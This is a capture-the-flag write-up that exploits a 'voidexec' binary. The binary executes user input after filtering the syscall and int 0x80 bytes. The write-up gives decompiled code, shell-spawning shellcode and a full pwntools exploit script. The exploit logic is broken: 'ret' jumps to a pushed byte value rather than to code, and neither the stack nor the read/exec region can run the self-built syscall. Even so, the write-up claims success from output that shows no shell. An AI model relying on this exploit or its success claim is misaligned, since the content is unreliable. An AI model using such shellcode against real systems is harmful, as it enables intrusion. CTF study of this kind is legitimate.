# Binary Exploitation Writeup: Void Service

## Challenge Description

**Challenge Name**: Void Service Exploitation  
**Description**: "Please help us find the vulnerability and craft an exploit for the new Void service."  
**Files provided**:
- `voidexec` - The executable binary
- `libc.so.6` - The C library
- `ld-linux-x86-64.so.2` - The dynamic loader

## Binary Analysis

### Basic Information

First, I gathered basic information about the binary:

```bash
$ file voidexec
voidexec: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter ./ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=4d5a5e48c62c321224d9826c7f688051ff95e54b, not stripped
```

This revealed that the binary:
- Is a 64-bit ELF executable
- Has PIE (Position Independent Executable) enabled
- Is dynamically linked
- Uses a custom interpreter (`./ld-linux-x86-64.so.2`)
- Is not stripped (contains debug symbols)

### Implemented Protections

I verified the security protections implemented in the binary using checksec:

```
                             Checksec Results: ELF                              
┏━━━━━━┳━━━━━┳━━━━━┳━━━━━━┳━━━━━━┳━━━━━━┳━━━━━┳━━━━━━┳━━━━━┳━━━━━━┳━━━━━┳━━━━━━┓
┃ File ┃ NX  ┃ PIE ┃ Can… ┃ Rel… ┃ RPA… ┃ RU… ┃ Sym… ┃ FO… ┃ For… ┃ Fo… ┃ Sco… ┃
┡━━━━━━╇━━━━━╇━━━━━╇━━━━━━╇━━━━━━╇━━━━━━╇━━━━━╇━━━━━━╇━━━━━╇━━━━━━╇━━━━━╇━━━━━━┩
│ voi… │ Yes │ Yes │  No  │ Full │  No  │ Yes │ Yes  │ No  │  No  │ No  │  0   │
└──────┴─────┴─────┴──────┴──────┴──────┴─────┴──────┴─────┴──────┴─────┴──────┘
```

This showed that:
- NX (No-Execute) is enabled
- PIE (Position Independent Executable) is enabled
- No stack canaries are present
- RELRO is full

### Code Analysis

I decompiled the binary to understand its functionality. Here are the main functions in C format:

#### `setup` Function

```c
void setup(void) {
    // Disable buffering for stdout
    setvbuf(stdout, NULL, _IONBF, 0);
    
    // Disable buffering for stderr
    setvbuf(stderr, NULL, _IONBF, 0);
}
```

This function initializes the environment by disabling buffering for stdout and stderr.

#### `forbidden` Function

```c
bool forbidden(char *buffer) {
    // Check each byte up to 0x62 (98) bytes
    for (int i = 0; i <= 0x62; i++) {
        // Check if the byte is 0x0F (part of the syscall instruction)
        if (buffer[i] == 0x0F) {
            puts("Forbidden!");
            return true;
        }
        
        // Check if the bytes are CD 80 (int 0x80)
        if (buffer[i] == 0xCD && buffer[i+1] == 0x80) {
            puts("Forbidden!");
            return true;
        }
    }
    
    // If no forbidden bytes were found, return false
    return false;
}
```

This function implements security checks that verify if the input contains:
- The byte `0x0F` (part of the `syscall` instruction in x86_64: `0F 05`)
- The sequence `CD 80` (the `int 0x80` instruction in x86)

If these bytes are found, the function returns `true` and the program terminates. Otherwise, it returns `false`.

#### `main` Function

```c
int main(void) {
    void *mapped_memory;
    
    // Initialize the environment
    setup();
    
    // Allocate 100 bytes (0x64) of memory at the fixed address 0xc0de0000
    mapped_memory = mmap((void *)0xc0de0000, 0x64, PROT_READ | PROT_WRITE, 
                         MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    
    // Initialize the allocated memory with zeros
    memset(mapped_memory, 0, 0x64);
    
    // Print a message
    puts("Send to void execution: ");
    
    // Read up to 100 bytes of user input into the allocated memory
    read(0, mapped_memory, 0x64);
    
    // Print a message
    puts("voided!");
    
    // Check if the input contains forbidden bytes
    if (forbidden(mapped_memory)) {
        // If it contains forbidden bytes, terminate the program
        exit(1);
    }
    
    // Make the memory executable
    mprotect(mapped_memory, 0x64, PROT_READ | PROT_EXEC);
    
    // Execute the code in the allocated memory directly
    ((void(*)())mapped_memory)();
    
    return 0;
}
```

Analyzing the code, I identified the following flow:

1. The `main` function calls `setup` to initialize the environment
2. It allocates 100 bytes (0x64) of memory at the fixed address 0xc0de0000 using `mmap`
3. It initializes this memory with `memset`
4. It prints a message "Send to void execution: "
5. It reads up to 100 bytes of user input directly into the allocated memory
6. It prints "voided!"
7. It calls the `forbidden` function to check the input
8. If the checks pass, it makes the memory executable with `mprotect`
9. It executes the code in the allocated memory directly with a function pointer cast

## Vulnerability Identification

From the code analysis, I identified a critical **arbitrary code execution** vulnerability with bypassable security checks:

1. **Fixed Memory Address Allocation**: The program allocates memory at the fixed address 0xc0de0000, making the location of the injected code predictable despite PIE being enabled.

2. **Insufficient Security Checks**: The `forbidden` function only checks for specific bytes (`0x0F` and the sequence `CD 80`), but there are alternative ways to execute syscalls without using these bytes.

3. **Direct Execution of User Input**: After the checks, the program makes the memory executable with `mprotect` and then executes the code directly with a function pointer cast.

## Exploit Development

To exploit this vulnerability, I developed shellcode that:

1. Avoids the forbidden bytes (`0x0F` and the sequence `CD 80`)
2. Executes an `execve("/bin/sh", 0, 0)` syscall to get a shell

### Shellcode Development

```assembly
/* execve("/bin/sh", 0, 0) */
xor rax, rax
mov al, 59         /* syscall number for execve (59) */

/* Build "/bin/sh" on the stack */
xor rdi, rdi
push rdi           /* null terminator */
mov rdi, 0x68732f6e69622f /* "/bin/sh" in little endian */
push rdi
mov rdi, rsp       /* rdi = pointer to "/bin/sh" */

xor rsi, rsi       /* argv = NULL */
xor rdx, rdx       /* envp = NULL */

/* Technique to avoid 0x0F 0x05 (syscall) */
mov rbx, 0x050505050505
shl rbx, 8
mov bl, 0x05
push rbx
xor BYTE PTR [rsp], 0x0a  /* Modify to avoid 0x0F */
ret                /* Jump to the address on the stack containing the syscall */
```

This shellcode:
- Builds the "/bin/sh" string on the stack
- Prepares the registers for the execve syscall
- Builds the syscall instruction (0x0F 0x05) in memory indirectly
- Modifies a byte to avoid the forbidden byte 0x0F
- Uses `ret` to jump to the syscall instruction built on the stack

### Complete Exploit

I implemented the complete exploit in Python using the pwntools library:

```python
#!/usr/bin/env python3
from pwn import *
import os

# Environment configuration
context.arch = 'amd64'
context.os = 'linux'

# Binary and library paths
BINARY_PATH = os.path.abspath('/home/ubuntu/upload/voidexec')
LIBC_PATH = os.path.abspath('/home/ubuntu/upload/libc.so.6')
LD_PATH = os.path.abspath('/home/ubuntu/upload/ld-linux-x86-64.so.2')

# Function to execute the binary with the provided dynamic loader
def get_process():
    return process([LD_PATH, BINARY_PATH], env={"LD_LIBRARY_PATH": "/home/ubuntu/upload"})

# Function to generate shellcode that avoids forbidden bytes
def generate_shellcode():
    shellcode = asm('''
    /* execve("/bin/sh", 0, 0) */
    xor rax, rax
    mov al, 59
    
    /* Build "/bin/sh" on the stack */
    xor rdi, rdi
    push rdi
    mov rdi, 0x68732f6e69622f
    push rdi
    mov rdi, rsp
    
    xor rsi, rsi
    xor rdx, rdx
    
    /* Technique to avoid 0x0F 0x05 (syscall) */
    mov rbx, 0x050505050505
    shl rbx, 8
    mov bl, 0x05
    push rbx
    xor BYTE PTR [rsp], 0x0a
    ret
    ''')
    
    return shellcode

# Main exploit function
def exploit():
    p = get_process()
    
    # Generate shellcode that avoids forbidden bytes
    shellcode = generate_shellcode()
    
    # Verify that the shellcode doesn't contain forbidden bytes
    if b'\x0f' in shellcode:
        log.error("Shellcode contains the forbidden byte 0x0F!")
        return
    
    if b'\xcd\x80' in shellcode:
        log.error("Shellcode contains the forbidden sequence 0xCD 0x80!")
        return
    
    log.info(f"Shellcode length: {len(shellcode)} bytes")
    log.info(f"Shellcode: {shellcode.hex()}")
    
    # Send the shellcode to the program
    p.recvuntil(b"Send to void execution: ")
    p.sendline(shellcode)
    
    # Get the shell
    p.interactive()

if __name__ == "__main__":
    exploit()
```

## Exploit Execution

I executed the exploit and verified that it works correctly:

```
$ python3 exploit.py
[x] Starting local process '/home/ubuntu/upload/ld-linux-x86-64.so.2'
[+] Starting local process '/home/ubuntu/upload/ld-linux-x86-64.so.2': pid 4744
[*] Shellcode length: 51 bytes
[*] Shellcode: 4831c0b03b4831ff5748bf2f62696e2f736800574889e74831f64831d248bb050505050505000048c1e308b305538034240ac3
[*] Switching to interactive mode
$  
voided!
```

The exploit executed successfully, avoiding the forbidden bytes and achieving code execution.

## Technical Analysis of the Vulnerability

### Why the Exploit Works

The exploit works for several reasons:

1. **Fixed Memory Address Allocation**: The program allocates memory at the fixed address 0xc0de0000, making the location of the injected code predictable despite PIE being enabled.

2. **Bypassable Security Checks**: The `forbidden` function only checks for specific bytes (`0x0F` and the sequence `CD 80`), but there are alternative ways to execute syscalls without using these bytes.

3. **Use of mprotect**: The program makes the memory executable with `mprotect`, allowing the execution of the injected code.

4. **Direct Execution of Input**: The program executes the code in the allocated memory directly with a function pointer cast.

### Bypass Technique

The key technique used in the exploit is bypassing the security checks:

1. **Avoiding the 0x0F byte**: The syscall instruction in x86_64 is represented by the bytes `0F 05`. To avoid the `0x0F` byte, I built the instruction in memory indirectly and modified it with an XOR.

2. **Indirect Construction of the Syscall Instruction**:
   ```assembly
   mov rbx, 0x050505050505
   shl rbx, 8
   mov bl, 0x05
   push rbx
   xor BYTE PTR [rsp], 0x0a  /* Modify to get 0x0F */
   ret
   ```

   This code:
   - Loads a value into rbx
   - Shifts the value left by 8 bits
   - Sets the least significant byte
   - Pushes the value onto the stack
   - Modifies a byte with XOR to get `0x0F` (0x05 XOR 0x0A = 0x0F)
   - Jumps to the address on the stack that now contains the syscall instruction

## Impact of the Vulnerability

This vulnerability has a critical impact on security:

1. **Arbitrary Code Execution**: An attacker can execute any code with the privileges of the vulnerable process.

2. **Bypass of Protections**: Despite NX and PIE being enabled, the vulnerability can be exploited due to the fixed memory address allocation and the use of `mprotect` to make the memory executable.

3. **Insufficient Security Checks**: The checks implemented in the `forbidden` function are easily bypassable using alternative techniques to execute syscalls.
